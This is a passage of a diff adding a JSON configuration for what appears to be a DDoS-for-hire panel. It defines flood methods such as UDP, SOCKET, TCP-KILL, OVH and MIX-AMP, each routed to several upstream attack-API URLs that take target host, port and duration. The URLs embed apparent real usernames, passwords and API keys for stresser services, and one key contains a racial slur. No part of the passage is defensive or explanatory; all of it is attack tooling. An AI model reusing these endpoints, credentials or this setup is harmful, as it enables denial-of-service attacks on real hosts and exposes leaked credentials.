+            "https://govslapped.homes/api/attack?username=zopz&secret=zopzapikey&host=[host]&port=[port]&time=[time]&method=UDP",
+            "http://185.216.71.125/api/attack?username=ZOPZ&secret=ZOPZ123&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDPPLAIN",
+            "https://api.vacstresser.ru/api?key=lAQkewjHX2gHV3Ci&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=WSD"
+        ]
+	},
+  {
+	
+		"name":"SOCKET",
+		"time":60,
+		"description":"SOCKET Flood",
+		"permission":["vip","admin"],
+		"api":[
+            "http://194.180.49.165:1335/attack?key=niggerkey&host=<<$host>>&port=<<$port>>&time=<<$time>>&type=Ludpflood&len=1",
+		       	"https://api.chryslervx.com/api/attack?username=zopzz&password=k60ny749QWd2MCKwdB1iHAznv101TBWg&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+            "https://govslapped.homes/api/attack?username=zopz&secret=zopzapikey&host=[host]&port=[port]&time=[time]&method=UDP",
+            "http://185.216.71.125/api/attack?username=ZOPZ&secret=ZOPZ123&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDPPLAIN",
+            "https://api.vacstresser.ru/api?key=lAQkewjHX2gHV3Ci&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=WSD"
+    		]
+	},
+  {
+	
+		"name":"TCP-KILL",
+		"time":60,
+		"description":"TCP-KILL Flood",
+		"permission":["vip","admin"],
+		"api":[
+            "http://kuramaservices.xyz/reborn/api/attack?username=OceanB&password=532555&target=<<$host>>&port=<<$port>>&duration=<<$time>>&method=TCP-KILL"
+    		]
+	},
+  {
+	
+		"name":"ROYAL",
+		"time":60,
+		"description":"ROYAL Flood",
+		"permission":["vip","admin"],
+		"api":[
+            "http://kuramaservices.xyz/reborn/api/attack?username=OceanB&password=532555&target=<<$host>>&port=<<$port>>&duration=<<$time>>&method=ROYAL"
+		]
+	},
+	{
+	
+		"name":"OVH",
+		"time":60,
+		"description":"OVH-ACK Flood",
+		"permission":["vip","admin"],  
+		"api":[
+            "https://api.vacstresser.ru/api?key=lAQkewjHX2gHV3Ci&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=OVHTCP",
+            "https://api.chryslervx.com/api/attack?username=zopzz&password=k60ny749QWd2MCKwdB1iHAznv101TBWg&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=OVH",
+            "https://govslapped.homes/api/attack?username=zopz&secret=zopzapikey&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=Ovhtcp",
+            "http://194.180.49.165:1335/attack?key=niggerkey&host=<<$host>>&port=<<$port>>&time=<<$time>>&type=Ludpflood&len=1",
+            "http://185.216.71.125/api/attack?username=ZOPZ&secret=ZOPZ123&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=OVHTCP"
+		]
+	},
+	{
+	
+		"name":"OVH-TCP",
+		"time":60,
+		"description":"OVH-TCP Flood",
+		"permission":["vip","admin"],
+		"api":[
+            "https://api.vacstresser.ru/api?key=lAQkewjHX2gHV3Ci&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=OVHTCP",
+            "https://api.chryslervx.com/api/attack?username=zopzz&password=k60ny749QWd2MCKwdB1iHAznv101TBWg&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=OVH",
+            "https://govslapped.homes/api/attack?username=zopz&secret=zopzapikey&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=Ovhtcp"
+		]
+	},
+	{
+	
+		"name":"INFRALY-ALL",
+		"time":60,
+		"description":"INFRALY-ALL Flood",
+		"permission":["vip","admin"],
+		"api":[
+            "http://kuramaservices.xyz/reborn/api/attack?username=OceanB&password=532555&target=<<$host>>&port=<<$port>>&duration=<<$time>>&method=TEMPEST-ALL"
+		]
+	},
+	{
+	
+		"name":"MIX-AMP",
+		"time":60,
+		"description":"MIX-AMP Flood",
+		"permission":["vip","admin"],
+		"api":[
+            "http://kuramaservices.xyz/reborn/api/attack?username=OceanB&password=532555&target=<<$host>>&port=<<$port>>&duration=<<$time>>&method=MIX-AMP"
+		]
+	},
+	{
+	
+		"name":"PATH-ALL",
+		"time":60,
+		"description":"PATH Flood",
+		"permission":["vip","admin"],
+		"api":[
+            "http://kuramaservices.xyz/reborn/api/attack?username=OceanB&password=532555&target=<<$host>>&port=<<$port>>&duration=<<$time>>&method=PATH-ALL"
+		]
+	},
+    {
+	
+		"name":"OVH-UDP",
+		"time":60,
+		"description":"OVH Flood",
+		"permission":["vip","admin"],
+		"api":[
+			"https://api.chryslervx.com/api/attack?username=zopzz&password=k60ny749QWd2MCKwdB1iHAznv101TBWg&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=OVH",
+      "http://kuramaservices.xyz/reborn/api/attack?username=OceanB&password=532555&target=<<$host>>&port=<<$port>>&duration=<<$time>>&method=OVH-UDP"
+    ]
+}
+]
